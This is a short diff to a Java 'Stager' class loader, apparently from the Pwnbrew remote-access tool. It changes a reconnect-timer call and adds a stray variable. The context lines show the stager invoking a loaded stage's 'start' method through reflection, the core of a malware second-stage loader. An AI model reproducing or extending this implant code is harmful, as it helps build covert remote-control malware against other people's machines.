@@ -122,7 +122,7 @@ public class Stager extends ClassLoader {
                         Long aLong = Long.parseLong(sleepTime );
                         Date tmpDate = new Date( aLong ); 
 
-                        aTimer.addReconnectTime(tmpDate);
+                        aTimer.setIntialSleepDate(tmpDate);
                     }
 
                     //Get sleep time if it exists
@@ -338,6 +338,7 @@ public class Stager extends ClassLoader {
 
                         Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
                         aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
+                        int i =0;
                     }   
             }
         
